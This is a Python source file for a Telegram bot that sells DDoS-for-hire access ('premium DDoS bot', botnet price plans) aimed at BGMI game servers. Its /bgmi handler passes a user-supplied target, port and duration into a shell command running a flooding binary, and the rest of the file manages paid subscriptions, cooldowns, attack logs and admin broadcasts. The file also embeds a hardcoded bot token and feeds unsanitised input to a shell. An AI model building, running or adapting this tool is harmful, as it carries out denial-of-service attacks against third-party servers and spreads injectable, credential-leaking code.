import telebot
import json
import datetime
import re
import os
import tempfile 
import time
import subprocess


# Replace 'YOUR_BOT_TOKEN' with your actual Telegram bot token
bot = telebot.TeleBot('7370183113:AAElyslMmO0_Ieya0-CRNWnl-zGksnTeArk')

# Admin user IDs
admin_id = ["888561579","2066320814"]

# File to store user data
USER_FILE = "users.json"

# Initialize user data dictionary
users_data = {}
LOG_FILE = "commands.log"

# Initialize user data dictionary
users_data = {}


LOG_FILE = 'commands.log'  # Replace with your actual log file path
OUTPUT_FILE = 'YOUR_LOG.txt'  # Name of the file to send

# Function to read user data from JSON file
def read_users():
    global users_data
    try:
        if os.path.exists(USER_FILE):
            with open(USER_FILE, "r") as file:
                users_data = json.load(file)
        else:
            users_data = {}
    except Exception as e:
        print(f"Error reading user file: {e}")
        users_data = {}

# Function to write user data to JSON file
def write_users():
    try:
        with open(USER_FILE, "w") as file:
            json.dump(users_data, file, indent=4)
    except Exception as e:
        print(f"Error writing user file: {e}")

# Initialize user data on bot startup
read_users()


# Function to set and store expiry date for a user
def set_and_store_expiry_date(user_id, duration, time_unit):
    global users_data
    try:
        current_time = datetime.datetime.now()
        if time_unit in ["hour", "hours"]:
            expiry_date = (current_time + datetime.timedelta(hours=duration)).isoformat()
        elif time_unit in ["day", "days"]:
            expiry_date = (current_time + datetime.timedelta(days=duration)).isoformat()
        elif time_unit in ["week", "weeks"]:
            expiry_date = (current_time + datetime.timedelta(weeks=duration)).isoformat()
        elif time_unit in ["month", "months"]:
            expiry_date = (current_time + datetime.timedelta(days=30 * duration)).isoformat()  # Approximation of a month
        else:
            return False

        users_data[user_id] = {"expiry_date": expiry_date}
        write_users()
        return True
    except Exception as e:
        print(f"Error setting expiry date: {e}")
        return False

# Function to format datetime into AM/PM format
def format_datetime_am_pm(dt):
    try:
        return dt.strftime("%Y-%m-%d %I:%M %p") if dt else "Not set"
    except Exception as e:
        print(f"Error formatting datetime: {e}")
        return "Not set"

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    global users_data
    try:
        if user_id in users_data and 'expiry_date' in users_data[user_id]:
            expiry_date = datetime.datetime.fromisoformat(users_data[user_id]['expiry_date'])
            remaining_time_delta = expiry_date - datetime.datetime.now()
            if remaining_time_delta.total_seconds() > 0:
                remaining_days = remaining_time_delta.days
                remaining_hours = remaining_time_delta.seconds // 3600
                remaining_minutes = (remaining_time_delta.seconds % 3600) // 60
                return f"{remaining_days} days, {remaining_hours} hours, {remaining_minutes} minutes"
        return "Expired"
    except Exception as e:
        print(f"Error calculating remaining approval time: {e}")
        return "Error"

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    global users_data
    user_id = str(message.from_user.id)
    bot.send_chat_action(message.chat.id, 'typing')  # Show typing action
    time.sleep(0.5)  # Simulate a delay for the typing indicator       
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 3:  # Ensure there are exactly 3 parts: command, user_to_add, duration
            user_to_add = command[1]
            duration_str = command[2]

            try:
                # Extract the numeric part of the duration and the time unit
                match = re.match(r"(\d+)([a-zA-Z]+)", duration_str)
                if not match:
                    raise ValueError("Invalid format")
                duration = int(match.group(1))
                time_unit = match.group(2).lower()

                if duration <= 0 or time_unit not in ['hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months']:
                    raise ValueError("Invalid duration or time unit")

            except (ValueError, IndexError) as e:
                response = f"Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'. Error: {str(e)}"
                bot.reply_to(message, response)
                return

            if user_to_add not in users_data:
                if set_and_store_expiry_date(user_to_add, duration, time_unit):
                    expiry_date = datetime.datetime.fromisoformat(users_data[user_to_add]['expiry_date'])
                    expiry_date_formatted = format_datetime_am_pm(expiry_date)
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {expiry_date_formatted} 👍."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = "Only admins can execute this command. If you are an admin, please contact @legend_Nik ,  @mr_1shchouhan for access."

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    global users_data
    user_id = str(message.from_user.id)
    try:
        bot.send_chat_action(message.chat.id, 'typing')  # Show typing action
        time.sleep(0.5)  # Simulate a delay for the typing indicator
        user_info = bot.get_chat(user_id)
        username = user_info.username if user_info.username else "N/A"
        user_role = "Admin" if user_id in admin_id else "User"
        expiry_date_str = users_data.get(user_id, {}).get('expiry_date', 'Not Approved')
        if expiry_date_str != 'Not Approved':
            expiry_date = datetime.datetime.fromisoformat(expiry_date_str)
            expiry_date_formatted = format_datetime_am_pm(expiry_date)
        else:
            expiry_date_formatted = expiry_date_str
        remaining_time = get_remaining_approval_time(user_id)
        response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {expiry_date_formatted}\n⏳ Remaining Approval Time: {remaining_time}"
        bot.reply_to(message, response, parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, f"Error retrieving user info: {e}")


# Command handler for /allusers command
@bot.message_handler(commands=['allusers'])
def all_users_info(message):
    global users_data, admin_id
    user_id = str(message.from_user.id)
    bot.send_chat_action(message.chat.id, 'typing')  # Show typing action
    time.sleep(0.5)  # Simulate a delay for the typing indicator
    if user_id in admin_id:
        if not users_data:
            bot.reply_to(message, "No users found.")
            return
        
        total_users = len(users_data)
        response = f"List of all users:\n\n 👤 Total users: {total_users}\n\n"
        
        for user_id, user_info in users_data.items():
            username = user_info.get('username', 'N/A')
            user_role = "Admin" if user_id in admin_id else "User"
            expiry_date_str = user_info.get('expiry_date', 'Not set')
            
            if expiry_date_str != 'Not set':
                expiry_date = datetime.datetime.fromisoformat(expiry_date_str)
                expiry_date_formatted = expiry_date.strftime("%Y-%m-%d %I:%M %p")
            else:
                expiry_date_formatted = expiry_date_str
            
            remaining_time = get_remaining_approval_time(user_id)
            
            response += f"👤 User ID: <code>{user_id}</code>\n"
            response += f"   📝 Username: {username}\n"
            response += f"   🔖 Role: {user_role}\n"
            response += f"   📅 Approval Expiry Date: {expiry_date_formatted}\n"
            response += f"   ⏳ Remaining Approval Time: {remaining_time}\n\n"
        
    else:
        response = "Only admins can execute this command. If you are an admin, please contact @legend_Nik ,  @mr_1shchouhan for access."

    bot.reply_to(message, response, parse_mode="HTML")
    


# Command handler for /searchuser command
@bot.message_handler(commands=['searchuser'])
def search_user(message):
    global users_data
    user_id = str(message.from_user.id)
    bot.send_chat_action(message.chat.id, 'typing')  # Show typing action
    time.sleep(0.5)  # Simulate a delay for the typing indicator
    if user_id not in admin_id:
        bot.reply_to(message, "Only admins can execute this command. If you are an admin, please contact @legend_Nik ,  @mr_1shchouhan for access.")
        return
    
    command = message.text.split()
    if len(command) != 2:  # Ensure there are exactly 2 parts: command and user_id_to_search
        bot.reply_to(message, "Please provide a user ID to search (e.g., /searchuser <userid>).")
        return
    
    user_id_to_search = command[1]
    
    if user_id_to_search in users_data:
        user_info = users_data[user_id_to_search]
        username = user_info.get('username', 'N/A')
        user_role = "Admin" if user_id_to_search in admin_id else "User"
        expiry_date_str = user_info.get('expiry_date', 'Not set')
        
        if expiry_date_str != 'Not set':
            expiry_date = datetime.datetime.fromisoformat(expiry_date_str)
            expiry_date_formatted = format_datetime_am_pm(expiry_date)
        else:
            expiry_date_formatted = expiry_date_str
        
        remaining_time = get_remaining_approval_time(user_id_to_search)
        response = f"👤 User ID: <code>{user_id_to_search}</code>\n"
        response += f"   📝 Username: {username}\n"
        response += f"   🔖 Role: {user_role}\n"
        response += f"   📅 Approval Expiry Date: {expiry_date_formatted}\n"
        response += f"   ⏳ Remaining Approval Time: {remaining_time}\n\n"
    else:
        response = f"No user found with ID {user_id_to_search}."
    bot.reply_to(message, response, parse_mode="HTML")



# State to track if admin has confirmed the clear action
confirmation_state = {}

# Command handler for /clearusers command to clear all user data
@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    global confirmation_state
    user_id = str(message.from_user.id)
    bot.send_chat_action(message.chat.id, 'pen_clear')  # Show typing action
    time.sleep(0.5)  # Simulate a delay for the typing indicator
    if user_id in admin_id:
        confirmation_state[user_id] = 'pending'
        bot.reply_to(message, "Are you sure you want to clear all user details? \n\nSend /confirm_clear to proceed.")
    else:
        response = "Only admins can execute this command. If you are an admin, please contact @legend_Nik ,  @mr_1shchouhan for access."
        bot.reply_to(message, response)

# Function to clear user data
def clear_users():
    global users_data
    users_data.clear()
    write_users()

# Handler for text messages to confirm clearing users
@bot.message_handler(func=lambda message: str(message.from_user.id) in confirmation_state and confirmation_state[str(message.from_user.id)] == 'pen_clear')
def handle_confirmation(message):
    global confirmation_state
    user_id = str(message.from_user.id)
    if message.text.lower() == '/confirm_clear':
        clear_users()
        response = "Users cleared successfully ✅"
    else:
        response = "Clear users operation cancelled ❌"
    confirmation_state.pop(user_id)
    bot.reply_to(message, response)
    

# Command handler for /remove command 
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.from_user.id)
    bot.send_chat_action(message.chat.id, 'typing')  # Show typing action
    time.sleep(0.5)  # Simulate a delay for the typing indicator
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in users_data:
                del users_data[user_to_remove]
                write_users()  # Save changes to the JSON file
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid> 😘'''
    else:
        response = "Only admins can execute this command. If you are an admin, please contact @legend_Nik ,  @mr_1shchouhan for access."

    bot.reply_to(message, response)







@bot.message_handler(commands=['help'])
def show_help(message):
    bot.send_chat_action(message.chat.id, 'typing')  # Show typing action
    time.sleep(0.5)  # Simulate a delay for the typing indicator
    help_text ='''🤖 Available commands:
💥 /bgmi : Method For Bgmi Servers. 
💥 /rules : Please Check Before Use !!.
💥 /mylogs : To Check Your Recents Attacks.
💥 /plan : Checkout Our Botnet Rates.
💥 /myinfo : TO Check Your WHOLE INFO.

🤖 To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.

Buy From :- @legend_Nik ,  @mr_1shchouhan , 
Official Channel :- https://t.me/+1eBX1cEr_9RhMjM9
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
🤖Try To Run This Command : /help 
✅BUY :- @legend_Nik ,  @mr_1shchouhan'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    bot.send_chat_action(message.chat.id, 'typing')  # Show typing action
    time.sleep(0.5)  # Simulate a delay for the typing indicator
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. MAKE SURE YOU JOINED https://t.me/ReoModz OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    bot.send_chat_action(message.chat.id, 'typing')  # Show typing action
    time.sleep(0.5)  # Simulate a delay for the typing indicator
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip 🌟 :
-> Attack Time : 280 (S)
> After Attack Limit : 300 sec
-> Concurrents Attack : 5

Pr-ice List💸 :
Day-->100 Rs
Week-->400 Rs
Month-->1000 Rs
'''
    bot.reply_to(message, response)

# Command handler for /admincmd command
@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    global admin_id
    user_id = str(message.from_user.id)
    bot.send_chat_action(message.chat.id, 'typing')  # Show typing action
    time.sleep(0.5)  # Simulate a delay for the typing indicator
    if user_id in admin_id:
        user_name = message.from_user.first_name
        response = f'''Hello {user_name}, Admin Commands Are Here!!:
    
        💥 /add <userId> : Add a User.
        💥 /remove <userId> : Remove a User.
        💥 /allusers : Authorized Users Lists.
        💥 /searchuser <userId>: Search Authorized Users.
        💥 /logs : All Users Logs.
        💥 /broadcast : Broadcast a Message.
        💥 /clearlogs : Clear The Logs File.
        💥 /clearusers : Clear The USERS File.
        '''
    else:
        response = "Only admins can execute this command. If you are an admin, please contact @legend_Nik ,  @mr_1shchouhan for access."

    bot.reply_to(message, response)

# Add /broadcast command to send notification to all user
# Global variable to store broadcast message temporarily
broadcast_message_to_send = None

@bot.message_handler(commands=['broadcast'])
def start_broadcast(message):
    global broadcast_message_to_send
    user_id = str(message.from_user.id)
    bot.send_chat_action(message.chat.id, 'typing')  # Show typing action
    time.sleep(0.5)  # Simulate a delay for the typing indicator
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            broadcast_message_to_send = command[1]
            response = f"⚠️ Please confirm the message to broadcast:\n\n{broadcast_message_to_send}\n\nSend /confirm_broadcast to proceed."
        else:
            response = "🤖 Please provide a message to broadcast."
    else:
        response = "Only admins can execute this command. If you are an admin, please contact @legend_Nik ,  @mr_1shchouhan for access.."

    bot.reply_to(message, response)

@bot.message_handler(commands=['confirm_broadcast'])
def confirm_broadcast(message):
    global broadcast_message_to_send
    user_id = str(message.from_user.id)
    
    if user_id in admin_id:
        if broadcast_message_to_send:
            try:
                with open(USER_FILE, "r") as file:
                    user_data = json.load(file)
                
                successful_sends = []
                failed_sends = []
                
                for user_id, data in user_data.items():
                    try:
                        bot.send_message(user_id, broadcast_message_to_send)
                        successful_sends.append(user_id)
                    except Exception as e:
                        failed_sends.append(f"{user_id}: {str(e)}")
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
                
                response = "Broadcast Message Sent Successfully To:\n"
                if successful_sends:
                    response += "\n".join(successful_sends)
                else:
                    response += "No valid users found."
                
                if failed_sends:
                    response += "\n\nFailed to send to:\n"
                    response += "\n".join(failed_sends)
                    
            except FileNotFoundError:
                response = f"⚠️ {USER_FILE} not found."
            except json.JSONDecodeError:
                response = f"⚠️ Error decoding {USER_FILE}. Check JSON formatting."
        else:
            response = "⚠️ No message to broadcast. Use /broadcast command first."
        
        broadcast_message_to_send = None  # Reset broadcast message after attempting to send messages
    else:
        response = "Only admins can execute this command. If you are an admin, please contact @legend_Nik ,  @mr_1shchouhan for access. 😡."

    bot.reply_to(message, response)




# Function to log command to the file
def log_command(user_id, command, target=None, port=None, time=None):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    log_entry = f"Username: {username} | Command: {command} | Time: {datetime.datetime.now()}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")


# Function to clear the log file


# Function to clear the log file
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            log_content = file.read()
            if log_content.strip() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.seek(0)
                file.truncate()  # Clearing the file content
                response = "Logs Cleared Successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear ❌."

    return response


# Command handler for /clearlogs to clear logs
@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.from_user.id)
    bot.send_chat_action(message.chat.id, 'typing')  # Show typing action
    time.sleep(0.5)  # Simulate a delay for the typing indicator
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "Only admins can execute this command. If you are an admin, please contact @legend_Nik ,  @mr_1shchouhan for access."
    bot.reply_to(message, response)


# Command handler for /logs to show recent logs (only for admins)
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.from_user.id)
    bot.send_chat_action(message.chat.id, 'typing')  # Show typing action
    time.sleep(0.5)  # Simulate a delay for the typing indicator
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌."
            bot.reply_to(message, response)
    else:
        response = "Only admins can execute this command. If you are an admin, please contact @legend_Nik ,  @mr_1shchouhan for access."
        bot.reply_to(message, response)
        

        #my log
@bot.message_handler(commands=['mylogs'])
def mylogs(message):
    bot.send_chat_action(message.chat.id, 'typing')  # Show typing action
    time.sleep(0.5)  # Simulate a delay for the typing indicator
    user_username = message.from_user.username
    if not user_username:
        bot.reply_to(message, "Your username is not available. Please set a username on Telegram.")
        return
    
    try:
        with open(LOG_FILE, 'r') as file:
            command_logs = file.readlines()

        user_logs = [
            log.strip() for log in command_logs
            if f"Username: @{user_username}" in log and ("/bgmi" in log)
        ]

        if user_logs:
            # Write matching logs to a file named YOUR_LOG.txt in a temporary directory
            with open(OUTPUT_FILE, 'w') as output_file:
                output_file.write("\n".join(user_logs))

            # Send the file to Telegram
            with open(OUTPUT_FILE, 'rb') as file_to_send:
                bot.send_document(message.chat.id, file_to_send, caption="Your Command Logs")

            # Delete the temporary file after sending
            os.remove(OUTPUT_FILE)
        
        else:
            response = "❌ No Command Logs Found For You ❌."
            bot.reply_to(message, response)

    except FileNotFoundError:
        bot.reply_to(message, "No command logs found.")


# Function to handle the reply when users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = (
        f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n"
        f"𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n"
        f"𝐏𝐨𝐫𝐭: {port}\n"
        f"𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n"
        f"𝐌𝐞𝐭𝐡𝐨𝐝: VIP KA KALA JADU"
    )
    bot.reply_to(message, response)
# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}
COOLDOWN_TIME = 240  # Adjusted cooldown time to 10 seconds

# Handler for /bgmi command
# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.from_user.id)
    bot.send_chat_action(message.chat.id, 'typing')  # Show typing action
    try:
        with open(USER_FILE, "r") as file:
            user_data = json.load(file)
            if user_id in user_data:
                user_expiry_date = datetime.datetime.fromisoformat(user_data[user_id]["expiry_date"])
                current_time = datetime.datetime.now()
                if current_time < user_expiry_date:
                    # Check if the user is an admin
                    if user_id in admin_id:

                        is_admin = True
                    else:
                        is_admin = False
                    
                    # Check if the user has run the command before and is still within the cooldown period
                    if not is_admin and user_id in bgmi_cooldown and (current_time - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                        response = "You are on cooldown. Please wait 240 seconds before running the /bgmi command again."
                        bot.reply_to(message, response)
                        return
                    
                    # Update the last time the user ran the command
                    bgmi_cooldown[user_id] = current_time
                    
                    command = message.text.split()
                    if len(command) == 4:  # Updated to accept target, port, and time
                        target = command[1]
                        port = int(command[2])  # Convert port to integer
                        time = int(command[3])  # Convert time to integer
                        if time > 240:
                            response = "Error: Time interval must be less than 600."
                        else:
                            # Record command logs and start the attack
                            log_command(user_id, '/bgmi', target, port, time)
                            start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                            full_command = f"./reo {target} {port} {time} 500"
                            process = subprocess.run(full_command, shell=True)
                            response = f"BGMI attack finished. Target: {target} Port: {port} Time: {time}"
                            bot.reply_to(message, response)  # Notify the user that the attack is finished
                    else:
                        response = "Usage: /bgmi <target> <port> <time>"  # Updated command syntax
                else:
                    response = "Your access has expired. Please renew your subscription."
            else:
                response = "Unauthorized access!\nOops! It seems like you don't have permission to use the /bgmi command."
    except FileNotFoundError:
        response = "User data file not found. Please contact support."
    
    bot.reply_to(message, response)

# Start polling
# bot.polling(none_stop=True)

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)




